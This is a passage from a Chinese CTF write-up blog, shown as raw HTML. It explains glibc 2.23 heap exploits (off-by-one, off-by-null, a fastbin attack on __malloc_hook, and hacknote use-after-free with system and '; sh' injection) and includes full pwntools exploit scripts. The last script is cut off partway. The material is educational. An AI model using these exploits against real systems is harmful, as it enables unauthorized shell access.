class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>) <span class="hljs-comment">#idx 0 </span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span>) <span class="hljs-comment">#idx 1</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x90</span>) <span class="hljs-comment">#idx 2</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x10</span>) <span class="hljs-comment">#idx 3</span><br></code></pre></td></tr></table></figure><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220925214653726.png" class="" title="image-20220925214653726"><p>然后编辑chunk0将chunk1的size改大(0xa1)，覆盖到chunk2，同时编辑chunk2修改prev_size为0xa0，实现chunk1与chunk2的overlap，操作后的布局如下：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220925225058672.png" class="" title="image-20220925225058672"><p>这时释放chunk1进入unsortedbin，再将chunk1申请回来，这时释放chunk2，unsortedbin的地址就会同时出现在chunk1与chunk2里，最后show(1)即可完成地址泄露。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x20</span>)+p8(<span class="hljs-number">0xa1</span>))<span class="hljs-comment">#offbyone</span><br>edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">14</span>+p64(<span class="hljs-number">0xa0</span>)+p64(<span class="hljs-number">0x21</span>))<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0xa1</span>))<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>操作完毕的堆布局如下：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220925225635985.png" class="" title="image-20220925225635985"><p>可以看到地址成功被泄露出来。</p><h4 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h4><p>泄露地址之后直接打fastbin即可，申请四个fast大小的堆块chunk，edit chunk4修改chunk5的size为0xe1覆盖chunk6；然后free6，再free5，然后再把unsortedbin中的chunk5申请出来，修改chunk6的fd指针为malloc-0x23，最后申请一个chunk写malloc_hook即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x68</span>+<span class="hljs-string">&#x27;\xe1&#x27;</span>) <br>free(<span class="hljs-number">6</span>)<br>free(<span class="hljs-number">5</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;abcd&#x27;</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="hljs-number">8</span>))<br></code></pre></td></tr></table></figure><p>执行之后打印malloc_hook：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926185455460.png" class="" title="image-20220926185455460"><p>成功写入了realloc，getshell。</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926185557730.png" class="" title="image-20220926185557730"><h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h3><p><strong>libc-2.23</strong></p><p>在布局的时候出现了一些问题，我泄露地址的布局是偶尔发现的，没有考虑到此布局会影响下一步getshell的堆布局，原因在于UB切割之后剩下了0x200的堆块，这导致我在后面add的时候又从这个堆块切割了，最终会造成堆块布局的混乱。</p><p>我泄露地址的方式是发现当我add出一个堆块进行overlap的时候，chunk的data区第2个8字节是main_arena+1096，于是我就直接通过它泄露地址了。</p><p>看来还是得用常规布局，水平太菜还是按部就班吧。</p><h4 id="泄露地址-1"><a href="#泄露地址-1" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>off by null常规布局应该是合并三个堆块，但这题我合并三个堆块总是会报错，但合并四个就没问题，</p><p>由于offbynull溢出会吃掉两个字节，因此要申请0xf8的大小，也就是实际上0x100的堆块，刚好改变pre_inuse位同时不改变size。</p><p>首先申请五个堆块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;d&#x27;</span>*<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;e&#x27;</span>*<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#4 can not fullfill it! otherwise it will change topchunk&#x27;s prev_inuse</span><br></code></pre></td></tr></table></figure><p>free(0)再add回来，这时候把chunk2填满，最后8字节伪造chunk3的prev_size，同时溢出\x00。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0x300</span>))<span class="hljs-comment">#(0+1+2)</span><br></code></pre></td></tr></table></figure><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220930190350883.png" class="" title="image-20220930190350883"><p>下一步首先free(0)，以满足堆块合并，然后free(3)触发合并，最终得到0x400大小的unsortedbin_chunk。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">0</span>) <br>free(<span class="hljs-number">3</span>) <span class="hljs-comment">#touch off merge</span><br></code></pre></td></tr></table></figure><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220930190923396.png" class="" title="image-20220930190923396"><p>这时候chunk1 和chunk2都没有被free，这就完成了overlap，我在这发现，按理说申请出新堆块会清空fd和bk等指针，但是当我继续从unsortedbin切割一个堆块的时候发现，bk指针处有libc地址残留：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">3</span>,<span class="hljs-number">0x200</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">6</span>) <br><span class="hljs-comment">#这里填6个a是因为原fd处也有6个字节0x7f开头的数据残留，但是不全没有利用价值，因此就直接覆盖也便于识别。</span><br></code></pre></td></tr></table></figure><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220930191523723.png" class="" title="image-20220930191523723"><p>注意我们0x400堆块的开头，也就是原chunk0处会有残留的指针，而且指向的是main_arena+1096的地址，直接show就即可。</p><p>据此我们就可以计算出libc偏移为<code>1096+0x10+0x3c4b10=0x3c4f68</code>。</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220930192146214.png" class="" title="image-20220930192146214"><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>布局思路不变，不过我们要使用fastbin attack，就需要把第2个堆块的大小改为0x68。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">5</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br></code></pre></td></tr></table></figure><p>老规矩，先触发merge，但是这里在merge的时候出现了一个小问题，就是上次布局遗留的unsorted过多，导致这次申请堆块的时候还会切割，然后会剩下一个进入smallbin</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220930192651108.png" class="" title="image-20220930192651108"><p>由于它隔在堆块中间，因此会影响合并，解决办法就是把它申请出来即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;e&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0x3f0</span>)) <span class="hljs-comment"># chunk5+chunk6+chunk7 = chunk8&#x27;s prev_size</span><br>free(<span class="hljs-number">5</span>) <span class="hljs-comment">#must free the first chunk </span><br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x78</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>) <span class="hljs-comment">#add from smallbins</span><br>free(<span class="hljs-number">8</span>) <span class="hljs-comment">#merge</span><br></code></pre></td></tr></table></figure><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220930192921207.png" class="" title="image-20220930192921207"><p>此时第2个chunk与unsorted构成了overlap，这时候申请一个可以覆盖第2个chunk fd指针的chunk，再修改fd指针，最后劫持malloc_hook即可。</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220930193416524.png" class="" title="image-20220930193416524"><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220930193635784.png" class="" title="image-20220930193635784"><p>成功劫持。完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span> <br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span> <br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span> <br><br>l64     = <span class="hljs-keyword">lambda</span>                    :u64(io.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>l32     = <span class="hljs-keyword">lambda</span>                    :u32(io.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>s       = <span class="hljs-keyword">lambda</span> data               :io.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :io.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br><br>io=process(<span class="hljs-string">&quot;./offbynull&quot;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">p</span>():<br>gdb.attach(io)<br>raw_input()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    sla(<span class="hljs-string">&#x27;4:delete\n&#x27;</span>,<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;index:&#x27;</span>,index)<br>    sla(<span class="hljs-string">&#x27;size:&#x27;</span>,size)<br>    sla(<span class="hljs-string">&#x27;content:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&#x27;4:delete\n&#x27;</span>,<span class="hljs-number">2</span>)<br>sla(<span class="hljs-string">&#x27;index:&#x27;</span>,index)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>sla(<span class="hljs-string">&#x27;4:delete\n&#x27;</span>,<span class="hljs-number">3</span>)<br>sla(<span class="hljs-string">&#x27;index:&#x27;</span>,index)<br>sl(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&#x27;4:delete\n&#x27;</span>,<span class="hljs-number">4</span>)<br>sla(<span class="hljs-string">&#x27;index:&#x27;</span>,index)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;d&#x27;</span>*<span class="hljs-number">0xf0</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0xf0</span>) <br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0xf0</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;e&#x27;</span>*<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#can not fullfill it! otherwise it will change top chunk&#x27;s prev_inuse</span><br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0x300</span>))<br>free(<span class="hljs-number">0</span>) <br>free(<span class="hljs-number">3</span>) <span class="hljs-comment">#touch off merge</span><br><span class="hljs-comment"># p()</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x200</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">6</span>)<br><span class="hljs-comment"># free(1)</span><br><br>show(<span class="hljs-number">3</span>)<br>leak=l64()<br>libc_base=leak-<span class="hljs-number">0x3c4f68</span><br>malloc_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>og=libc_base+<span class="hljs-number">0x4527a</span><br>realloc=libc_base+libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>target=malloc_hook-<span class="hljs-number">0x23</span><br><br>log.success(<span class="hljs-string">&quot;leak==&gt;%s&quot;</span>,<span class="hljs-built_in">hex</span>(leak))<br>log.success(<span class="hljs-string">&quot;libc_base==&gt;%s&quot;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-string">&quot;malloc_hook==&gt;%s&quot;</span>,<span class="hljs-built_in">hex</span>(malloc_hook))<br><span class="hljs-comment">#leak</span><br><br><span class="hljs-comment"># p()</span><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br><br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;e&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0x3f0</span>)) <span class="hljs-comment"># chunk5+chunk6+chunk7 = chunk8&#x27;s prev_size</span><br>free(<span class="hljs-number">5</span>) <span class="hljs-comment">#must free the first chunk </span><br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x78</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>) <span class="hljs-comment">#add from smallbin</span><br>free(<span class="hljs-number">8</span>) <span class="hljs-comment">#merge</span><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x130</span>,<span class="hljs-string">&#x27;deadbeef&#x27;</span>)<br>free(<span class="hljs-number">6</span>) <span class="hljs-comment"># fastbin attack</span><br>edit(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xf8</span>)+p64(<span class="hljs-number">0x70</span>)+p64(target))<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">11</span>+p64(og)+p64(realloc+<span class="hljs-number">8</span>))<br>sla(<span class="hljs-string">&quot;delete\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&quot;:\n&quot;</span>,<span class="hljs-string">&quot;12&quot;</span>)<br>sla(<span class="hljs-string">&quot;:\n&quot;</span>,<span class="hljs-string">&quot;20&quot;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a>pwnable_hacknote</h3><p>漏洞点：指针调用、劫持指针</p><p>例行检查，32位ELF，没开pie。</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926193402657.png" class="" title="image-20220926193402657"><p>ida扫一遍，菜单，有增、删、查功能，限制申请堆块个数5个。</p><p>申请的时候会先申请一个note块，用于存放puts函数与content的地址，注意puts的地址是其他函数返回的：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926194926217.png" class="" title="image-20220926194926217"><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926195000594.png" class="" title="image-20220926195000594"><p>如果我们申请一个堆块，结构是这样的：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926200527419.png" class="" title="image-20220926200527419"><p>红框内是note堆块，而下方是我们申请的堆块。note堆块里存放了puts函数的地址以及chunk的data区地址</p><p>同时注意到show函数处，使用的是指针调用，ptr</p><p>指向的就是note块的puts函数。</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926193851959.png" class="" title="image-20220926193851959"><p>明显这里我们可以直接修改ptr的值，去调用其他函数。</p><p>delete处发现free之后指针没有置空，存在UAF</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926193655270.png" class="" title="image-20220926193655270"><p>结合UAF，思路就明显了。</p><h4 id="泄露地址-2"><a href="#泄露地址-2" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>首先我们申请两个0x20大小的堆块chunk0与chunk1，然后释放，note和chunk会分别进入0x10与0x20的fastbin。既然note和chunk会同时进入bin，那么如果我们申请大小为0x8的chunk，前一半0x8作为note后一半0x8作为content。这时候content就会直接覆盖chunk1的note(fastbin LIFO)，这时修改chunk1的note填入puts与free_got，在申请回来执行show(1)，就可以泄露free_got的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x20</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0x20</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x8</span>,p32(<span class="hljs-number">0x804862b</span>)+p32(<span class="hljs-number">0x804a018</span>)) <span class="hljs-comment">#2 func_puts + free_got</span><br>show(<span class="hljs-number">1</span>)<br>free_addr=u32(io.recv(<span class="hljs-number">4</span>))<br><br>libc_base=free_addr-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;free_got===&gt;%s\nsystem===&gt;%s&quot;</span>,<span class="hljs-built_in">hex</span>(free_addr),<span class="hljs-built_in">hex</span>(system))<br></code></pre></td></tr></table></figure><p>成功泄露</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220926224315090.png" class="" title="image-20220926224315090"><h4 id="getshell-1"><a href="#getshell-1" class="headerlink" title="getshell"></a>getshell</h4><p>同样的方法，我们将note中的put换成system，然后使用管道符 || sh 或者分隔符 ; sh 来使得程序执行下一步sh。</p><p>至于为什么不能是system(“&#x2F;bin&#x2F;sh”)，那是因为system的参数是固定为system的地址，即固定执行system(system_addr)，因此我们加入 管道符或者分号会忽略上一步的错误命令继续执行下一条。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># from LibcSearcher import *</span><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>l64     = <span class="hljs-keyword">lambda</span>                    :u64(io.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>l32     = <span class="hljs-keyword">lambda</span>                    :u32(io.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>s       = <span class="hljs-keyword">lambda</span> data               :io.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :io.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">p</span>():<br>gdb.attach(io)<br>raw_input()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choice</span>(<span class="hljs-params">i</span>):<br>sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,i)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>choice(<span class="hljs-number">1</span>)<br>sla(<span class="hljs-string">&#x27;size :&#x27;</span>,size)<br>sla(<span class="hljs-string">&#x27;Content :&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>choice(<span class="hljs-number">3</span>)<br>sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,index)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span 